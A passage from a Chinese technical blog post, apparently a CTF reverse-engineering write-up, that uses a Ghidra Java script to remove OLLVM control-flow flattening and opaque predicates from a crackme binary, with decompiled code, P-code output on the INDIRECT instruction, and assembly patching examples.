class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(undefined4 param_1,undefined8 param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">time_t</span> tVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_98 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_90 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_88 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_80 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125; local_78 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_70 [<span class="number">7</span>];</span><br><span class="line">  byte local_69;</span><br><span class="line">  <span class="type">int</span> local_68;</span><br><span class="line">  <span class="type">int</span> local_64;</span><br><span class="line">  <span class="type">int</span> local_60;</span><br><span class="line">  <span class="type">int</span> local_5c;</span><br><span class="line">  byte local_58 [<span class="number">24</span>];</span><br><span class="line">  undefined local_40 [<span class="number">8</span>];</span><br><span class="line">  $_3 local_38 [<span class="number">8</span>];</span><br><span class="line">  undefined local_30 [<span class="number">8</span>];</span><br><span class="line">  $_2 local_28 [<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> local_24;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined4 local_18;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  undefined local_a;</span><br><span class="line">  undefined local_9;</span><br><span class="line">  </span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  local_20 = param_2;</span><br><span class="line">  local_18 = param_1;</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  local_24 = (<span class="type">int</span>)tVar2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;func(?)=\&quot;01abfc750a0c942167651c40d088531d\&quot;?&quot;</span>);</span><br><span class="line">  iVar1 = getchar();</span><br><span class="line">  local_58[<span class="number">0</span>] = (byte)iVar1;</span><br><span class="line">  fgets((<span class="type">char</span> *)(local_58 + <span class="number">1</span>),<span class="number">0x15</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  local_5c = (<span class="type">int</span>)tVar2;</span><br><span class="line">  local_60 = local_5c - local_24;</span><br><span class="line">  local_10 = local_60;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> &lt; local_60) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let the silent second hand take the place of my doubt...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_00400c30;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    sVar3 = <span class="built_in">strlen</span>((<span class="type">char</span> *)local_58);</span><br><span class="line">    local_64 = (<span class="type">int</span>)sVar3;</span><br><span class="line">LAB_00400c30:</span><br><span class="line">    sVar3 = <span class="built_in">strlen</span>((<span class="type">char</span> *)local_58);</span><br><span class="line">    local_64 = (<span class="type">int</span>)sVar3;</span><br><span class="line">    local_a = local_64 != <span class="number">0x15</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">  <span class="keyword">if</span> (local_64 != <span class="number">0x15</span>) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    local_68 = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">  local_64 = <span class="number">0x15</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x14</span> &lt; local_68) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_004010ea;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win&quot;</span>);</span><br><span class="line">LAB_004010ea:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_00400dd3;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      local_69 = local_58[local_68] ^ (byte)local_60;</span><br><span class="line">      local_70[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,local_69);</span><br><span class="line">      local_78[<span class="number">0</span>] = (&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_1::operator()(local_40,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;::operator()(local_78,<span class="number">7</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_70,(<span class="type">char</span>)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_80[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_2::operator()(local_28,local_69);</span><br><span class="line">      local_88[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_2::operator()(local_28,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_88,<span class="number">0x12</span>);</span><br><span class="line">      local_90[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_3::operator()(local_38,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_90,<span class="string">&#x27;\x03&#x27;</span>);</span><br><span class="line">      local_98[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_98,<span class="string">&#x27;\x02&#x27;</span>);</span><br><span class="line">      <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_80,(byte)iVar1);</span><br><span class="line">LAB_00400dd3:</span><br><span class="line">      local_69 = local_58[local_68] ^ (byte)local_60;</span><br><span class="line">      local_70[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,local_69);</span><br><span class="line">      local_78[<span class="number">0</span>] = (&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_1::operator()(local_40,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;::operator()(local_78,<span class="number">7</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_70,(<span class="type">char</span>)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_80[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_2::operator()(local_28,local_69);</span><br><span class="line">      local_88[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_2::operator()(local_28,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_88,<span class="number">0x12</span>);</span><br><span class="line">      local_90[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_3::operator()(local_38,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_90,<span class="string">&#x27;\x03&#x27;</span>);</span><br><span class="line">      local_98[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_98,<span class="string">&#x27;\x02&#x27;</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_80,(byte)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_9 = enc[local_68 + <span class="number">-1</span>] != local_69;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">    <span class="keyword">if</span> (enc[local_68 + <span class="number">-1</span>] != local_69) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">    local_68 = local_68 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，整个控制流已经完全正确地展现在我们面前。虽然还有一些全局变量的混淆，但至少已经能读懂了。需要注意的是，还有一个lambda函数无法被正常解混淆，因为其状态变量不是直接比较，而是进行了加运算再与0比较。这实际上和直接比较没什么区别，但会导致我们的脚本无法识别。因此还需要进行一些优化。</p>
<p>下面，还是首先处理一下与只读未写全局变量相关的混淆。这类混淆实际上混淆效果远不如控制流平坦化，但是出现在反汇编代码中还是让人难受。为了满足我这要了命的强迫症，遂决定静下心研究一番。</p>
<p>对于程序中所有全局变量的获取并没有什么难度。首先可以通过获取所有Symbol得到程序中的所有符号，这些符号包括标号（Label）和函数（Function），将函数剔除，然后获取该Label下的Data数据。在Ghidra的初始分析中，包含对变量引用的分析。Ghidra提供了获取全局变量引用的API，更方便的是，这些引用信息中还包含对变量的具体引用方式，包括读、写、调用等。因此，可以非常方便地获取所有没有写只有读的全局变量。这些全局变量在被读取时的值一定都是0。</p>
<h2 id="全局变量混淆去除"><a class="markdownIt-Anchor" href="#全局变量混淆去除"></a> 全局变量混淆去除</h2>
<p>从上面的反汇编代码可以看出，全局变量混淆主要是通过永真表达式<code>(x * (x + -1) &amp; 1U) == 0 || y &lt; 10</code>和永假表达式<code>(x * (x + -1) &amp; 1U) != 0 &amp;&amp; 9 &lt; y</code>实现的。混淆后，同一段代码逻辑被复制为两份，但实际上只会执行一份。</p>
<p>因此，要想实现自动化解除此类混淆，就需要能够正确识别此类表达式并计算出结果。</p>
<p>不难发现，这些表达式有一些统一的特征：表达式的结果仅由只读不写的全局变量决定。通过对控制流平坦化的去混淆过程可知，所有条件跳转均通过<code>CBRANCH</code>实现，在分析后得到的高级P-code（PcodeOpAST）序列中，可以通过<code>getDef</code>方法获取一个Varnode被定义的P-code指令。因此，我们可以利用这个API层层向上回溯，梳理出条件跳转的条件被计算的全过程，形成一个树状结构。梳理完成后，获取所有参与计算的非常数Varnode。若所有这些Varnode都是全局变量，则说明：<font color=red>我们找到了一个通过全局变量进行混淆的假分支</font>。随后，只需要按部就班地完成计算，即可确定条件跳转的条件的值，就可以安全移除这个假分支了。</p>
<p>不过，在具体脚本编写过程中，我还发现了一个问题。</p>
<p>在高级P-code序列中，有这样一类指令：<code>INDIRECT</code>。这是一种高级P-code指令，有2个输入参数和1个输出参数。它是为了满足P-code静态单赋值特性而设计的。那么这条指令到底有什么作用呢？</p>
<p>在Ghidra的一个Issue中有人提到了不理解<code>INDIRECT</code>指令的问题，下面是我认为最好的一个回答：</p>
<blockquote>
<p>I think that INDIRECT just indicates the varnode in output can be affected by the pcode indicated by it’s input1.<br />
So it’s impossible for a varnode to be affected when it’s both not the output of an instruction and it’s not associated with the instruction through an INDIRECT.<br />
In other words, the varnodes being the output of all INDIRECTs associated with an instruction is the over-approximation of all varnodes that may be affected by the execution of this instruction. Only CALL/CALLIND instructions can have side affects because we need to take the execution of their corresponding subroutines into consideration. So INDIRECT instructions only appear before CALL/CALLIND instructions.<br />
I wonder if my understanding is proper.<br />
Thank you.</p>
</blockquote>
<p>对于全局变量而言，一个线程的不同函数均有可能修改其值。为保证两次为全局变量重新赋值之间的所有本函数P-code在访问全局变量时获取的值均相同，需要强制添加<code>INDIRECT</code>指令作为一条针对全局变量的“可能的”重新赋值指令。这条指令需要添加在函数调用指令<code>CALL</code>、<code>CALLIND</code>之前，表示这条<code>CALL</code>或<code>CALLIND</code>有可能会影响到<code>INDIRECT</code>输出Varnode的值。<code>INDIRECT</code>指令的第2个参数一定是一个常数Varnode，将其解析为int后可<strong>使用该<code>INDIRECT</code>指令的地址和这个int值</strong>创建一个SequenceNumber序列号对象。每一个序列号都对应着一个<code>CALL</code>或<code>CALLIND</code>指令，表示这条函数调用指令可能会影响输出Varnode的值。</p>
<p><code>INDIRECT</code>将函数调用指令与Varnode建立了联系，<font color=red><strong>它使得在任意P-code序列中，对于任意的Varnode，除非它作为一条P-code的输出Varnode，或它通过<code>INDIRECT</code>指令与某条函数调用指令建立联系（此时这个Varnode实际上还是作为输出Varnode存在），否则任何P-code指令将无法修改该Varnode的值。</strong></font>前面这句话可能需要一段时间理解，但却是我认为最能够总结<code>INDIRECT</code>指令功能的一句话。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OllvmSolver.java&gt; (ram, 0x6020c4, 4) INDIRECT (ram, 0x6020c4, 4) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff68, 1) INDIRECT (stack, 0xffffffffffffff68, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff70, 1) INDIRECT (stack, 0xffffffffffffff70, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff78, 1) INDIRECT (stack, 0xffffffffffffff78, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff80, 1) INDIRECT (stack, 0xffffffffffffff80, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff88, 1) INDIRECT (stack, 0xffffffffffffff88, 1) , (const, 0x454, 4)</span><br></pre></td></tr></table></figure>
<p>举个例子，上面的输出所有行成对来看，第一行为<code>INDIRECT</code> P-code指令，第二行为序列号为0x454的指令。上面的例子可以说明，0x4016C0这个函数的调用可能会导致<code>(ram, 0x6020c4, 4)</code>、<code>(stack, 0xffffffffffffff68, 1)</code>等Varnode的值发生改变。有读者可能会问，为什么一个函数调用会修改局部变量的值？这实际上是一种过拟合，<code>INDIRECT</code>只是进行了指示，并不是说这个值在函数调用后一定会发生改变。</p>
<p>生成上述输出的Script代码片段在下面给出。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Address addr: hFunction.getFunction().getBody().getAddresses(<span class="literal">true</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Iterator&lt;PcodeOpAST&gt; iter = hFunction.getPcodeOps(addr);</span><br><span class="line">    <span class="keyword">if</span> (iter.hasNext()) &#123;</span><br><span class="line">        printf(<span class="string">&quot;Address: %#x\n&quot;</span>, addr.getOffset());</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            <span class="type">PcodeOpAST</span> <span class="variable">op</span> <span class="operator">=</span> iter.next();</span><br><span class="line">            <span class="keyword">if</span> (op.getOpcode() == PcodeOp.INDIRECT) &#123;</span><br><span class="line">                <span class="type">SequenceNumber</span> <span class="variable">sn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SequenceNumber</span>(addr, (<span class="type">int</span>) op.getInput(<span class="number">1</span>).getOffset());</span><br><span class="line">                println(<span class="string">&quot;INDIRECT: &quot;</span> + hFunction.getPcodeOp(sn).toString());</span><br><span class="line">            &#125;</span><br><span class="line">            println(op.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OK，现在我们已经知道，<code>INDIRECT</code>指令只不过是指示函数调用对Varnode可能产生的影响。但前面我们已经分析得到了所有的只读不写全局变量。如果<code>INDIRECT</code>指令的输出是这些全局变量中的一个，我们实际上完全可以将其忽略不计。因此在梳理计算过程的树数据结构时，当到达<code>INDIRECT</code>时，就可以停止递归了。</p>
<p>在树数据结构梳理完成，计算完成后，就可以考虑如何对程序本身的汇编代码进行修改了。</p>
<p>在本题中，所有相关的假分支都是通过<code>cmovxx</code>实现的，但是此类指令已经全部被控制流平坦化修改为<code>jnz</code>和<code>jmp</code>指令了。</p>
<p>如下面的示例，控制流平坦化解混淆前：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0040101e 41  0f  9c  c1    SETL       R9B</span><br><span class="line">00401022 45  08  c8       OR         R8B ,R9B</span><br><span class="line">00401025 41  f6  c0  01    TEST       R8B ,0x1</span><br><span class="line">00401029 0f  45  c1       CMOVNZ     iVar1 ,ECX</span><br><span class="line">0040102c 89  85  6c       MOV        dword ptr [RBP  + local_9c ],iVar1 ; update state var, OK to be deleted</span><br><span class="line">         ff  ff  ff</span><br><span class="line">00401032 e9  ac  02       JMP        LAB_004012e3</span><br><span class="line">         00  00</span><br></pre></td></tr></table></figure>
<p>解混淆后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0040101e 41  0f  9c  c1    SETL       R9B</span><br><span class="line">00401022 45  08  c8       OR         R8B ,R9B</span><br><span class="line">00401025 41  f6  c0  01    TEST       R8B ,0x1</span><br><span class="line">00401029 75  0c           JNZ        LAB_00401037</span><br><span class="line">0040102b 66  e9  86  02    JMP        LAB_004012b5</span><br><span class="line">0040102f ff              ??         FFh</span><br><span class="line">00401030 ff              ??         FFh</span><br><span class="line">00401031 ff              ??         FFh</span><br><span class="line">00401032 e9  ac  02       JMP        LAB_004012e3</span><br><span class="line">         00  00</span><br></pre></td></tr></table></figure>
<p>由于<code>jnz</code>条件已知，因此只需要将其修改为<code>nop</code>（条件不满足）或<code>jmp</code>（条件满足）即可。</p>
<p>最终的脚本：<a href="OllvmSolver.java">脚本链接</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">162</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">22:50</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
